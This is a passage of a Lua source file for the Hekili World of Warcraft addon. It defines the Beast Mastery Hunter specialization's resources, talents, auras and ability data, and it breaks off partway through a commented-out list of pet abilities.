-- Hunter Beast Mastery
-- May 2018

local addon, ns = ...
local Hekili = _G[ addon ]

local class = Hekili.Class
local state = Hekili.State

local PTR = ns.PTR


-- Shadowlands
-- Legendaries
-- [x] Call of the Wild
-- [-] Nessingwary's Trapping Apparatus (leave as reactive)
-- [x] Soulforge Embers
-- [x] Craven Strategem

-- [-] Dire Command (passive/reactive)
-- [x] Flamewaker's Cobra Sting
-- [x] Qa'pla, Eredun War Order
-- [-] Rylakstalker's Piercing Fangs (passive/reactive)

-- Conduits
-- [x] Bloodletting
-- [-] Echoing Call
-- [x] Ferocious Appetite
-- [-] One with the Beast

-- Covenants
-- [-] Enfeebled Mark
-- [-] Empowered Release
-- [x] Necrotic Barrage
-- [x] Spirit Attunement

-- Endurance
-- [x] Harmony of the Tortollan
-- [-] Markman's Advantage (sp)
-- [x] Rejuvenating Wind
-- [-] Resilience of the Hunter

-- Finesse
-- [x] cheetahs_vigor
-- [x] reversal_of_fortune
-- [x] tactical_retreat


-- needed for Frenzy.
local FindUnitBuffByID, FindUnitDebuffByID = ns.FindUnitBuffByID, ns.FindUnitDebuffByID


if UnitClassBase( "player" ) == "HUNTER" then
    local spec = Hekili:NewSpecialization( 253, true )

    spec:RegisterResource( Enum.PowerType.Focus, {
        aspect_of_the_wild = {
            resource = "focus",
            aura = "aspect_of_the_wild",

            last = function ()
                local app = state.buff.aspect_oF_the_wild.applied
                local t = state.query_time

                return app + floor( t - app )
            end,

            interval = 1,
            value = 5,
        },

        barbed_shot = {
            resource = "focus",
            aura = "barbed_shot",

            last = function ()
                local app = state.buff.barbed_shot.applied
                local t = state.query_time

                return app + floor( t - app )
            end,

            interval = 2,
            value = 5,
        },

        barbed_shot_2 = {
            resource = "focus",
            aura = "barbed_shot_2",

            last = function ()
                local app = state.buff.barbed_shot_2.applied
                local t = state.query_time

                return app + floor( t - app )
            end,

            interval = 2,
            value = 5,
        },

        barbed_shot_3 = {
            resource = "focus",
            aura = "barbed_shot_3",

            last = function ()
                local app = state.buff.barbed_shot_3.applied
                local t = state.query_time

                return app + floor( t - app )
            end,

            interval = 2,
            value = 5,
        },

        barbed_shot_4 = {
            resource = "focus",
            aura = "barbed_shot_4",

            last = function ()
                local app = state.buff.barbed_shot_4.applied
                local t = state.query_time

                return app + floor( t - app )
            end,

            interval = 2,
            value = 5,
        },

        barbed_shot_5 = {
            resource = "focus",
            aura = "barbed_shot_5",

            last = function ()
                local app = state.buff.barbed_shot_5.applied
                local t = state.query_time

                return app + floor( t - app )
            end,

            interval = 2,
            value = 5,
        },

        barbed_shot_6 = {
            resource = "focus",
            aura = "barbed_shot_6",

            last = function ()
                local app = state.buff.barbed_shot_6.applied
                local t = state.query_time

                return app + floor( t - app )
            end,

            interval = 2,
            value = 5,
        },

        barbed_shot_7 = {
            resource = "focus",
            aura = "barbed_shot_7",

            last = function ()
                local app = state.buff.barbed_shot_7.applied
                local t = state.query_time

                return app + floor( t - app )
            end,

            interval = 2,
            value = 5,
        },

        barbed_shot_8 = {
            resource = "focus",
            aura = "barbed_shot_8",

            last = function ()
                local app = state.buff.barbed_shot_8.applied
                local t = state.query_time

                return app + floor( t - app )
            end,

            interval = 2,
            value = 5,
        },

        death_chakram = {
            resource = "focus",
            aura = "death_chakram",

            last = function ()
                return state.buff.death_chakram.applied + floor( state.query_time - state.buff.death_chakram.applied )
            end,

            interval = function () return class.auras.death_chakram.tick_time end,
            value = function () return state.conduit.necrotic_barrage.enabled and 5 or 3 end,
        }
    } )

    -- Talents
    spec:RegisterTalents( {
        killer_instinct = 22291, -- 273887
        animal_companion = 22280, -- 267116
        dire_beast = 22282, -- 120679

        scent_of_blood = 22500, -- 193532
        one_with_the_pack = 22266, -- 199528
        chimaera_shot = 22290, -- 53209

        trailblazer = 19347, -- 199921
        natural_mending = 19348, -- 270581
        camouflage = 23100, -- 199483

        spitting_cobra = 22441, -- 257891
        thrill_of_the_hunt = 22347, -- 257944
        a_murder_of_crows = 22269, -- 131894

        born_to_be_wild = 22268, -- 266921
        posthaste = 22276, -- 109215
        binding_shot = 22499, -- 109248

        stomp = 19357, -- 199530
        barrage = 22002, -- 120360
        stampede = 23044, -- 201430

        aspect_of_the_beast = 22273, -- 191384
        killer_cobra = 21986, -- 199532
        bloodshed = 22295, -- 321530
    } )


    -- PvP Talents
    spec:RegisterPvpTalents( { 
        dire_beast_basilisk = 825, -- 205691
        dire_beast_hawk = 824, -- 208652
        dragonscale_armor = 3600, -- 202589
        hiexplosive_trap = 3605, -- 236776
        hunting_pack = 3730, -- 203235
        interlope = 1214, -- 248518
        roar_of_sacrifice = 3612, -- 53480
        scorpid_sting = 3604, -- 202900
        spider_sting = 3603, -- 202914
        survival_tactics = 3599, -- 202746
        the_beast_within = 693, -- 212668
        viper_sting = 3602, -- 202797
        wild_protector = 821, -- 204190
    } )


    local tar_trap_targets = {}

    -- Auras
    spec:RegisterAuras( {
        a_murder_of_crows = {
            id = 131894,
            duration = 15,
            max_stack = 1,
        },

        aspect_of_the_cheetah = {
            id = 186258,
            duration = function () return conduit.cheetahs_vigor.enabled and 12 or 9 end,
            max_stack = 1,
        },

        aspect_of_the_cheetah_sprint = {
            id = 186257,
            duration = 3,
            max_stack = 1,
        },

        aspect_of_the_turtle = {
            id = 186265,
            duration = 8,
            max_stack = 1,
        },

        aspect_of_the_wild = {
            id = 193530,
            duration = 20,
            max_stack = 1,
        },

        barbed_shot = {
            id = 246152,
            duration = 8,
            max_stack = 1,
        },

        barbed_shot_2 = {
            id = 246851,
            duration = 8,
            max_stack = 1,
        },

        barbed_shot_3 = {
            id = 246852,
            duration = 8,
            max_stack = 1,
        },

        barbed_shot_4 = {
            id = 246853,
            duration = 8,
            max_stack = 1,
        },

        barbed_shot_5 = {
            id = 246854,
            duration = 8,
            max_stack = 1,
        },

        barbed_shot_6 = {
            id = 284255,
            duration = 8,
            max_stack = 1,
        },

        barbed_shot_7 = {
            id = 284257,
            duration = 8,
            max_stack = 1,
        },

        barbed_shot_8 = {
            id = 284258,
            duration = 8,
            max_stack = 1,
        },

        barbed_shot_dot = {
            id = 217200,
            duration = 8,
            max_stack = 1,
        },

        barrage = {
            id = 120360,
        },

        beast_cleave = {
            id = 118455,
            duration = 4,
            max_stack = 1,
            generate = function ()
                local bc = buff.beast_cleave
                local name, _, count, _, duration, expires, caster = FindUnitBuffByID( "pet", 118455 )

                if name then
                    bc.name = name
                    bc.count = 1
                    bc.expires = expires
                    bc.applied = expires - duration
                    bc.caster = caster
                    return
                end

                bc.count = 0
                bc.expires = 0
                bc.applied = 0
                bc.caster = "nobody"
            end,
        },

        bestial_wrath = {
            id = 19574,
            duration = 15,
            max_stack = 1,
        },

        binding_shot = {
            id = 117405,
            duration = 3600,
            max_stack = 1,
        },

        bloodshed = {
            id = 321538,
            duration = 18,
            max_stack = 1,
            generate = function ( t )
                local name, count, duration, expires, caster, _

                for i = 1, 40 do
                    name, _, count, _, duration, expires, caster = UnitDebuff( "target", 321538 )

                    if not name then break end
                    if name and UnitIsUnit( caster, "pet" ) then break end
                end

                if name then
                    t.name = name
                    t.count = count
                    t.expires = expires
                    t.applied = expires - duration
                    t.caster = "player"
                    return
                end

                t.count = 0
                t.expires = 0
                t.applied = 0
                t.caster = "nobody"
            end,
        },

        camouflage = {
            id = 199483,
            duration = 60,
            max_stack = 1,
        },

        concussive_shot = {
            id = 5116,
            duration = 6,
            max_stack = 1,
        },

        dire_beast = {
            id = 281036,
            duration = 8,
            max_stack = 1,
        },

        dire_beast_basilisk = {
            id = 209967,
            duration = 30,
            max_stack = 1,
        },

        dire_beast_hawk = {
            id = 208684,
            duration = 3600,
            max_stack = 1,
        },

        eagle_eye = {
            id = 6197,
            duration = 60,
        },

        exotic_beasts = {
            id = 53270,
        },

        feign_death = {
            id = 5384,
            duration = 360,
            max_stack = 1,
        },

        freezing_trap = {
            id = 3355,
            duration = 60,
            type = "Magic",
            max_stack = 1,
        },

        frenzy = {
            id = 272790,
            duration = function () return azerite.feeding_frenzy.enabled and 9 or 8 end,
            max_stack = 3,
            generate = function ()
                local fr = buff.frenzy
                local name, _, count, _, duration, expires, caster = FindUnitBuffByID( "pet", 272790 )

                if name then
                    fr.name = name
                    fr.count = count
                    fr.expires = expires
                    fr.applied = expires - duration
                    fr.caster = caster
                    return
                end

                fr.count = 0
                fr.expires = 0
                fr.applied = 0
                fr.caster = "nobody"
            end,
        },

        growl = {
            id = 2649,
            duration = 3,
            max_stack = 1,
        },

        hunters_mark = {
            id = 257284,
            duration = 3600,
            type = "Magic",
            max_stack = 1,
        },

        intimidation = {
            id = 24394,
            duration = 5,
            max_stack = 1,
        },

        kindred_spirits = {
            id = 56315,
        },

        masters_call = {
            id = 54216,
            duration = 4,
            type = "Magic",
            max_stack = 1,
        },

        misdirection = {
            id = 35079,
            duration = 8,
            max_stack = 1,
        },

        parsels_tongue = {
            id = 248085,
            duration = 8,
            max_stack = 4,
        },

        posthaste = {
            id = 118922,
            duration = 4,
            max_stack = 1,
        },

        predators_thirst = {
            id = 264663,
            duration = 3600,
            max_stack = 1,
        },

        spitting_cobra = {
            id = 194407,
            duration = 20,
            max_stack = 1,
        },

        stampede = {
            id = 201430,
        },

        tar_trap = {
            id = 135299,
            duration = 30,
            max_stack = 1,
        },

        thrill_of_the_hunt = {
            id = 257946,
            duration = 8,
            max_stack = 3,
        },

        trailblazer = {
            id = 231390,
            duration = 3600,
            max_stack = 1,
        },

        wild_call = {
            id = 185789,
        },


        -- PvP Talents
        hiexplosive_trap = {
            id = 236777,
            duration = 0.1,
            max_stack = 1,
        },

        interlope = {
            id = 248518,
            duration = 45,
            max_stack = 1,
        },

        roar_of_sacrifice = {
            id = 53480,
            duration = 12,
            max_stack = 1,
        },

        scorpid_sting = {
            id = 202900,
            duration = 8,
            type = "Poison",
            max_stack = 1,
        },

        spider_sting = {
            id = 202914,
            duration = 4,
            type = "Poison",
            max_stack = 1,
        },

        the_beast_within = {
            id = 212704,
            duration = 15,
            max_stack = 1,
        },

        viper_sting = {
            id = 202797,
            duration = 6,
            type = "Poison",
            max_stack = 1,
        },

        wild_protector = {
            id = 204205,
            duration = 3600,
            max_stack = 1,
        },


        -- Azerite Powers
        dance_of_death = {
            id = 274443,
            duration = 8,
            max_stack = 1
        },

        primal_instincts = {
            id = 279810,
            duration = 20,
            max_stack = 1
        },


        -- Utility
        mend_pet = {
            id = 136,
            duration = 10,
            max_stack = 1
        },


        -- Conduits
        resilience_of_the_hunter = {
            id = 339461,
            duration = 8,
            max_stack = 1
        },


        -- Legendaries
        nessingwarys_trapping_apparatus = {
            id = 336744,
            duration = 5,
            max_stack = 1,
            copy = { "nesingwarys_trapping_apparatus", "nesingwarys_apparatus", "nessingwarys_apparatus" }
        }
    } )

    spec:RegisterStateExpr( "barbed_shot_grace_period", function ()
        return ( settings.barbed_shot_grace_period or 0 ) * gcd.max
    end )

    spec:RegisterHook( "spend", function( amt, resource )
        if amt < 0 and resource == "focus" and buff.nessingwarys_trapping_apparatus.up then
            amt = amt * 2
        end

        return amt, resource
    end )


    local ExpireNesingwarysTrappingApparatus = setfenv( function()
        focus.regen = focus.regen * 0.5
        forecastResources( "focus" )
    end, state )


    spec:RegisterHook( "reset_precast", function()
        if debuff.tar_trap.up then
            debuff.tar_trap.expires = debuff.tar_trap.applied + 30
        end

        if buff.nesingwarys_apparatus.up then
            state:QueueAuraExpiration( "nesingwarys_apparatus", ExpireCelestialAlignment, buff.nesingwarys_apparatus.expires )
        end

        if now - action.resonating_arrow.lastCast < 6 then applyBuff( "resonating_arrow", 10 - ( now - action.resonating_arrow.lastCast ) ) end
    end )


    local trapUnits = { "target", "focus" }
    local trappableClassifications = {
        rare = true,
        elite = true,
        normal = true,
        trivial = true,
        minus = true
    }

    for i = 1, 5 do
        trapUnits[ #trapUnits + 1 ] = "boss" .. i
    end

    for i = 1, 40 do
        trapUnits[ #trapUnits + 1 ] = "nameplate" .. i
    end

    spec:RegisterHook( "COMBAT_LOG_EVENT_UNFILTERED", function( event, _, subtype, _, sourceGUID, sourceName, _, _, destGUID, destName, destFlags, _, spellID, spellName )
        if subtype == "SPELL_CAST_SUCCESS" and sourceGUID == GUID and spellID == 187698 and legendary.soulforge_embers.enabled then
            -- Capture all boss/elite targets present at this time as valid trapped targets.
            table.wipe( tar_trap_targets )
            
            for _, unit in ipairs( trapUnits ) do
                if UnitExists( unit ) and UnitCanAttack( "player", unit ) and not trappableClassifications[ UnitClassification( unit ) ] then
                    tar_trap_targets[ UnitGUID( unit ) ] = true
                end
            end
        end
    end )


    -- Abilities
    spec:RegisterAbilities( {
        a_murder_of_crows = {
            id = 131894,
            cast = 0,
            cooldown = 60,
            gcd = "spell",

            spend = 30,
            spendType = "focus",

            talent = "a_murder_of_crows",

            startsCombat = true,
            texture = 645217,

            handler = function ()
                applyDebuff( "target", "a_murder_of_crows" )
            end,
        },


        arcane_shot = {
            id = 185358,
            cast = 0,
            cooldown = 0,
            gcd = "spell",

            spend = 40,
            spendType = "focus",

            startsCombat = true,
            texture = 132218,

            handler = function ()
            end,
        },


        aspect_of_the_cheetah = {
            id = 186257,
            cast = 0,
            cooldown = function () return ( ( pvptalent.hunting_pack.enabled and 0.5 or 1 ) * ( legendary.call_of_the_wild.enabled and 0.75 or 1 ) * 180 ) + ( conduit.cheetahs_vigor.mod * 0.001 ) end,
            gcd = "spell",

            startsCombat = false,
            texture = 132242,

            handler = function ()
                applyBuff( "aspect_of_the_cheetah" )
                applyBuff( "aspect_of_the_cheetah_sprint" )
            end,
        },


        aspect_of_the_turtle = {
            id = 186265,
            cast = 8,
            cooldown = function() return ( ( legendary.call_of_the_wild.enabled and 0.75 or 1 ) * 180 ) + ( conduit.harmony_of_the_tortollan.mod * 0.001 ) end,
            gcd = "spell",
            channeled = true,

            startsCombat = false,
            texture = 132199,

            start = function ()
                applyBuff( "aspect_of_the_turtle" )
            end,
        },


        aspect_of_the_wild = {
            id = 193530,
            cast = 0,
            cooldown = function () return ( essence.vision_of_perfection.enabled and 0.87 or 1 ) * ( legendary.call_of_the_wild.enabled and 0.75 or 1 ) * 120 end,
            gcd = "off",

            toggle = "cooldowns",

            startsCombat = false,
            texture = 136074,

            nobuff = function ()
                if settings.aspect_vop_overlap then return end
                return "aspect_of_the_wild"
            end,

            handler = function ()
                applyBuff( "aspect_of_the_wild" )

                if azerite.primal_instincts.enabled then gainCharges( "barbed_shot", 1 ) end
            end,
        },


        barbed_shot = {
            id = 217200,
            cast = 0,
            charges = 2,
            cooldown = function () return ( conduit.bloodletting.enabled and 11 or 12 ) * haste end,
            recharge = function () return ( conduit.bloodletting.enabled and 11 or 12 ) * haste end,
            gcd = "spell",

            velocity = 50,

            startsCombat = true,
            texture = 2058007,

            cycle = "barbed_shot",

            handler = function ()
                if buff.barbed_shot.down then applyBuff( "barbed_shot" )
                else
                    for i = 2, 8 do
                        if buff[ "barbed_shot_" .. i ].down then applyBuff( "barbed_shot_" .. i ); break end
                    end
                end

                addStack( "frenzy", 8, 1 )

                if level > 33 then
                    setCooldown( "bestial_wrath", cooldown.bestial_wrath.remains - 12 )
                end

                applyDebuff( "target", "barbed_shot_dot" )

                if legendary.qapla_eredun_war_order.enabled then
                    setCooldown( "kill_command", 0 )
                end
            end,
        },


        barrage = {
            id = 120360,
            cast = function () return 3 * haste end,
            cooldown = 20,
            gcd = "spell",
            channeled = true,

            spend = 60,
            spendType = "focus",

            startsCombat = true,
            texture = 236201,

            start = function ()
            end,
        },


        bestial_wrath = {
            id = 19574,
            cast = 0,
            cooldown = 90,
            gcd = "spell",

            startsCombat = true,
            texture = 132127,

            nobuff = function () return settings.avoid_bw_overlap and "bestial_wrath" or nil, "avoid_bw_overlap is checked and bestial_wrath is up" end,

            handler = function ()
                applyBuff( "bestial_wrath" )
                if pvptalent.the_beast_within.enabled then applyBuff( "the_beast_within" ) end
                if talent.scent_of_blood.enabled then gainCharges( "barbed_shot", 2 ) end
            end,
        },


        binding_shot = {
            id = 109248,
            cast = 0,
            cooldown = 45,
            gcd = "spell",

            talent = "binding_shot",

            startsCombat = true,
            texture = 462650,

            handler = function ()
                applyDebuff( "target", "binding_shot" )
            end,
        },


        bloodshed = {
            id = 321530,
            cast = 0,
            cooldown = 60,
            gcd = "spell",

            toggle = "cooldowns",

            startsCombat = true,
            texture = 132139,

            handler = function ()
                applyDebuff( "target", "bloodshed" )
            end,
        },


        camouflage = {
            id = 199483,
            cast = 0,
            cooldown = 60,
            gcd = "spell",

            startsCombat = false,
            texture = 461113,

            handler = function ()
                applyBuff( "camouflage" )
            end,
        },


        chimaera_shot = {
            id = 53209,
            cast = 0,
            cooldown = 15,
            gcd = "spell",

            velocity = 50,

            talent = "chimaera_shot",

            startsCombat = true,
            texture = 236176,

            handler = function ()
                gain( 10 * min( 2, active_enemies ), "focus" )
            end,
        },


        cobra_shot = {
            id = 193455,
            cast = 0,
            cooldown = 0,
            gcd = "spell",

            velocity = 45,

            spend = 35,
            spendType = "focus",

            startsCombat = true,
            texture = 461114,

            handler = function ()
                if talent.killer_cobra.enabled and buff.bestial_wrath.up then setCooldown( "kill_command", 0 )
                else setCooldown( "kill_command", cooldown.kill_command.remains - 1 ) end
            end,
        },


        concussive_shot = {
            id = 5116,
            cast = 0,
            cooldown = 5,
            gcd = "spell",

            velocity = 50,

            startsCombat = true,
            texture = 135860,

            handler = function ()
                applyDebuff( "target", "concussive_shot" )
            end,
        },


        counter_shot = {
            id = 147362,
            cast = 0,
            cooldown = 24,
            gcd = "off",

            toggle = "interrupts",

            startsCombat = true,
            texture = 249170,

            debuff = "casting",
            readyTime = state.timeToInterrupt,

            handler = function ()
                if conduit.reversal_of_fortune.enabled then
                    gain( conduit.reversal_of_fortune.mod, "focus" )
                end

                interrupt()
            end,
        },


        dire_beast = {
            id = 120679,
            cast = 0,
            cooldown = 15,
            gcd = "spell",

            spend = 25,
            spendType = "focus",

            startsCombat = true,
            texture = 236186,

            handler = function ()
                summonPet( "dire_beast", 8 )
            end,
        },


        dire_beast_basilisk = {
            id = 205691,
            cast = 0,
            cooldown = 120,
            gcd = "spell",

            spend = 60,
            spendType = "focus",

            toggle = "cooldowns",
            pvptalent = "dire_beast_basilisk",

            startsCombat = true,
            texture = 1412204,

            handler = function ()
                applyDebuff( "target", "dire_beast_basilisk" )
            end,
        },


        dire_beast_hawk = {
            id = 208652,
            cast = 0,
            cooldown = 30,
            gcd = "spell",

            spend = 30,
            spendType = "focus",

            pvptalent = "dire_beast_hawk",

            startsCombat = true,
            texture = 612363,

            handler = function ()
                applyDebuff( "target", "dire_beast_hawk" )
            end,
        },


        disengage = {
            id = 781,
            cast = 0,
            charges = 1,
            cooldown = 20,
            recharge = 20,
            gcd = "off",

            startsCombat = false,
            texture = 132294,

            handler = function ()
                if talent.posthaste.enabled then applyBuff( "posthaste" ) end
                if conduit.tactical_retreat.enabled and target.within8 then applyDebuff( "target", "tactical_retreat" ) end
            end,

            auras = {
                -- Conduits
                tactical_retreat = {
                    id = 339654,
                    duration = 3,
                    max_stack = 1
                }
            }
        },


        eagle_eye = {
            id = 6197,
            cast = 0,
            cooldown = 0,
            gcd = "spell",

            startsCombat = false,
            texture = 132172,

            handler = function ()
                applyBuff( "eagle_eye", 60 )
            end,
        },


        exhilaration = {
            id = 109304,
            cast = 0,
            cooldown = 120,
            gcd = "spell",

            startsCombat = false,
            texture = 461117,

            handler = function ()
                gain( 0.3 * health.max, "health" )
                if conduit.rejuvenating_wind.enabled then applyBuff( "rejuvenating_wind" ) end
            end,

            auras = {
                -- Conduit
                rejuvenating_wind = {
                    id = 339400,
                    duration = 8,
                    max_stack = 1
                }
            }
        },


        feign_death = {
            id = 5384,
            cast = 0,
            cooldown = function () return legendary.craven_stategem.enabled and 15 or 30 end,
            gcd = "spell",

            startsCombat = false,
            texture = 132293,

            handler = function ()
                applyBuff( "feign_death" )

                if legendary.craven_strategem.enabled then
                    removeDebuff( "player", "dispellable_curse" )
                    removeDebuff( "player", "dispellable_disease" )
                    removeDebuff( "player", "dispellable_magic" )
                    removeDebuff( "player", "dispellable_poison" )
                end
            end,
        },


        flare = {
            id = 1543,
            cast = 0,
            cooldown = 20,
            gcd = "spell",

            startsCombat = true,
            texture = 135815,

            handler = function ()
                if legendary.soulforge_embers.enabled and debuff.tar_trap.up then
                    applyDebuff( "target", "soulforge_embers" )
                    active_dot.soulforge_embers = max( 1, min( 5, active_dot.tar_trap ) )
                end
            end,

            auras = {
                soulforge_embers = {
                    id = 336746,
                    duration = 12,
                    max_stack = 1
                }
            }
        },


        freezing_trap = {
            id = 187650,
            cast = 0,
            cooldown = 30,
            gcd = "spell",

            spend = function ()
                if legendary.nessingwarys_trapping_apparatus.enabled then
                    return -45, "focus"
                end
            end,

            startsCombat = true,
            texture = 135834,

            handler = function ()
                applyDebuff( "target", "freezing_trap" )
            end,
        },


        hiexplosive_trap = {
            id = 236776,
            cast = 0,
            cooldown = 40,
            gcd = "spell",

            spend = function ()
                if legendary.nessingwarys_trapping_apparatus.enabled then
                    return -45, "focus"
                end
            end,

            pvptalent = "hiexplosive_trap",

            startsCombat = false,
            texture = 135826,

            handler = function ()
            end,
        },



        hunters_mark = {
            id = 257284,
            cast = 0,
            cooldown = 0,
            gcd = "spell",

            startsCombat = true,
            texture = 236188,

            handler = function ()
                applyDebuff( "target", "hunters_mark" )
            end,
        },


        interlope = {
            id = 248518,
            cast = 0,
            cooldown = 45,
            gcd = "spell",

            pvptalent = "interlope",

            startsCombat = false,
            texture = 132180,

            handler = function ()
            end,
        },


        intimidation = {
            id = 19577,
            cast = 0,
            cooldown = 60,
            gcd = "spell",

            startsCombat = true,
            texture = 132111,

            handler = function ()
                applyDebuff( "target", "intimidation" )
            end,
        },


        kill_command = {
            id = 34026,
            cast = 0,
            cooldown = function () return 7.5 * haste end,
            gcd = "spell",

            spend = function () return buff.flamewakers_cobra_sting.up and 0 or 30 end,
            spendType = "focus",

            startsCombat = true,
            texture = 132176,

            usable = function () return pet.alive, "requires a living pet" end,

            handler = function ()
                removeBuff( "flamewakers_cobra_sting" )

                if conduit.ferocious_appetite.enabled and stat.crit >= 100 then
                    reduceCooldown( "aspect_of_the_wild", conduit.ferocious_appetite.mod / 10 )
                end
            end,

            auras = {
                flamewakers_cobra_sting = {
                    id = 336826,
                    duration = 15,
                    max_stack = 1,
                }
            }
        },


        kill_shot = {
            id = 53351,
            cast = 0,
            charges = 1,
            cooldown = 10,
            recharge = 10,
            gcd = "spell",

            spend = function () return buff.flayers_mark.up and 0 or 10 end,
            spendType = "focus",

            startsCombat = true,
            texture = 236174,

            usable = function () return buff.flayers_mark.up or target.health_pct < 20 end,
            handler = function ()
                if buff.flayers_mark.up and legendary.pouch_of_razor_fragments.enabled then
                    applyDebuff( "target", "pouch_of_razor_fragments" )
                    removeBuff( "flayers_mark" )
                end
            end,
        },


        masters_call = {
            id = 272682,
            cast = 0,
            cooldown = 45,
            gcd = "spell",

            startsCombat = true,
            texture = 236189,

            handler = function ()
            end,
        },


        misdirection = {
            id = 34477,
            cast = 0,
            cooldown = 30,
            gcd = "spell",

            nopvptalent = "interlope",

            startsCombat = true,
            texture = 132180,

            handler = function ()
            end,
        },


        multishot = {
            id = 2643,
            cast = 0,
            cooldown = 0,
            gcd = "spell",

            spend = 40,
            spendType = "focus",

            startsCombat = true,
            texture = 132330,

            velocity = 40,

            handler = function ()
                applyBuff( "beast_cleave" )
            end,
        },


        primal_rage = {
            id = 272678,
            cast = 0,
            cooldown = 360,
            gcd = "spell",

            toggle = "cooldowns",

            startsCombat = true,
            texture = 136224,

            usable = function () return pet.alive and pet.ferocity, "requires a living ferocity pet" end,
            handler = function ()
                applyBuff( "primal_rage" )
                applyBuff( "bloodlust" )
                stat.haste = stat.haste + 0.4
                applyDebuff( "player", "exhaustion" )
            end,
        },


        roar_of_sacrifice = {
            id = 53480,
            cast = 0,
            cooldown = 60,
            gcd = "spell",

            pvptalent = "roar_of_sacrifice",

            startsCombat = false,
            texture = 464604,

            handler = function ()
                applyBuff( "roar_of_sacrifice" )
            end,
        },


        scorpid_sting = {
            id = 202900,
            cast = 0,
            cooldown = 24,
            gcd = "spell",

            pvptalent = "scorpid_sting",

            startsCombat = true,
            texture = 132169,

            handler = function ()
                applyDebuff( "target", "scorpid_sting" )
                setCooldown( "spider_sting", max( 8, cooldown.spider_sting.remains ) )
                setCooldown( "viper_sting", max( 8, cooldown.viper_sting.remains ) )
            end,
        },


        spider_sting = {
            id = 202914,
            cast = 0,
            cooldown = 45,
            gcd = "spell",

            pvptalent = "spider_sting",

            startsCombat = true,
            texture = 1412206,

            handler = function ()
                applyDebuff( "target", "spider_sting" )
                setCooldown( "scorpid_sting", max( 8, cooldown.scorpid_sting.remains ) )
                setCooldown( "viper_sting", max( 8, cooldown.viper_sting.remains ) )
            end,
        },


        spitting_cobra = {
            id = 194407,
            cast = 0,
            cooldown = 90,
            gcd = "spell",

            talent = "spitting_cobra",
            toggle = "cooldowns",

            startsCombat = true,
            texture = 236177,

            handler = function ()
                summonPet( "spitting_cobra", 20 )
                applyBuff( "spitting_cobra", 20 )
            end,
        },


        stampede = {
            id = 201430,
            cast = 0,
            cooldown = 120,
            gcd = "spell",

            toggle = "cooldowns",
            talent = "stampede",

            startsCombat = true,
            texture = 461112,

            handler = function ()
            end,
        },


        summon_pet = {
            id = 883,
            cast = 0,
            cooldown = 0,
            gcd = "spell",

            spend = 0,
            spendType = "focus",

            startsCombat = false,
            texture = 'Interface\\ICONS\\Ability_Hunter_BeastCall',

            essential = true,
            nomounted = true,

            usable = function () return not pet.exists, "requires no active pet" end,

            handler = function ()
                summonPet( "made_up_pet", 3600, "ferocity" )
            end,
        },


        tar_trap = {
            id = 187698,
            cast = 0,
            cooldown = function () return level > 55 and 25 or 30 end,
            gcd = "spell",

            spend = function ()
                if legendary.nessingwarys_trapping_apparatus.enabled then
                    return -45, "focus"
                end
            end,
            
            startsCombat = false,
            texture = 576309,

            -- Let's not recommend Tar Trap if Flare is on CD.
            timeToReady = function () return max( 0, cooldown.flare.remains - gcd.max ) end,

            handler = function ()
                applyDebuff( "target", "tar_trap" )
            end,
        },


        tranquilizing_shot = {
            id = 19801,
            cast = 0,
            cooldown = 10,
            gcd = "spell",

            startsCombat = true,
            texture = 136020,

            toggle = "interrupts",

            usable = function () return buff.dispellable_enrage.up or buff.dispellable_magic.up, "requires enrage or magic effect" end,
            handler = function ()
                removeBuff( "dispellable_enrage" )
                removeBuff( "dispellable_magic" )
                if level > 53 then gain( 10, "focus" ) end
            end,
        },

        viper_sting = {
            id = 202797,
            cast = 0,
            cooldown = 30,
            gcd = "spell",

            pvptalent = "viper_sting",

            startsCombat = true,
            texture = 236200,

            handler = function ()
                applyDebuff( "target", "spider_sting" )
                setCooldown( "scorpid_sting", max( 8, cooldown.scorpid_sting.remains ) )
                setCooldown( "viper_sting", max( 8, cooldown.viper_sting.remains ) )
            end,
        },


        --[[ wartime_ability = {
            id = 264739,
            cast = 0,
            cooldown = 0,
            gcd = "spell",

            startsCombat = true,
            texture = 1518639,

            handler = function ()
            end,
        }, ]]


        --[[ Pet Abilities
        -- Moths
        serenity_dust = {
            id = 264055,
            cast = 0,
            cooldown = 10,
            gcd = "spell",

            toggle = "interrupts",

            startsCombat = true,

            usable = function ()
                if not pet.alive then return false, "requires a living pet" end
                return buff.dispellable_enrage.up or buff.dispellable_magic.up, "requires enrage or magic debuff"
            end,
            handler = function ()
                removeBuff( "dispellable_enrage" )
                removeBuff( "dispellable_magic" )
            end,
        },


        -- Sporebats
        spore_cloud = {
            id = 264056,
            cast = 0,
            cooldown = 10,
            gcd = "spell",

            toggle = "interrupts",

            startsCombat = true,

            usable = function ()
                if not pet.alive then return false, "requires a living pet" end
                return buff.dispellable_enrage.up or buff.dispellable_magic.up, "requires enrage or magic debuff"
            end,
            handler = function ()
                removeBuff( "dispellable_enrage" )
                removeBuff( "dispellable_magic" )
            end,
        },


        -- Water Striders
        soothing_water = {
            id = 264262,
            cast = 0,
            cooldown = 10,
            gcd = "spell",

            toggle = "interrupts",

            startsCombat = true,

            usable = function ()
                if not pet.alive then return false, "requires a living pet" end
                return buff.dispellable_enrage.up or buff.dispellable_magic.up, "requires enrage or magic debuff"
            end,
            handler = function ()
                removeBuff( "dispellable_enrage" )
                removeBuff( "dispellable_magic" )
            end,
        },


        -- Bats
        sonic_blast = {
            id = 264263,
            cast = 0,
            cooldown = 10,
            gcd = "spell",

            toggle = "interrupts",

            startsCombat = true,

            usable = function ()
                if not pet.alive then return false, "requires a living pet" end
                return buff.dispellable_enrage.up or buff.dispellable_magic.up, "requires enrage or magic debuff"
            end,
            handler = function ()
                removeBuff( "dispellable_enrage" )
                removeBuff( "dispellable_magic" )
            end,
        },


        -- Nether Rays
        nether_shock = {
            id = 264264,
            cast = 0,
            cooldown = 10,
            gcd = "spell",

            toggle = "interrupts",

            startsCombat = true,

            usable = function ()
                if not pet.alive then return false, "requires a living pet" end
                return buff.dispellable_enrage.up or buff.dispellable_magic.up, "requires enrage or magic debuff"
            end,
            handler = function ()
                removeBuff( "dispellable_enrage" )
                removeBuff( "dispellable_magic" )
            end,
        },


        -- Cranes
        chijis_tranquility = {
            id = 264028,
            cast = 0,
            cooldown = 10,
            gcd = "spell",

            toggle = "interrupts",

            startsCombat = true,

            usable = function ()
                if not pet.alive then return false, "requires a living pet" end
                return buff.dispellable_enrage.up or buff.dispellable_magic.up, "requires enrage or magic debuff"
            end,
            handler = function ()
                removeBuff( "dispellable_enrage" )
                removeBuff( "dispellable_magic" )
            end,
        },


        -- Spirit Beasts
        spirit_shock = {
            id = 264265,
            cast = 0,
            cooldown = 10,
            gcd = "spell",

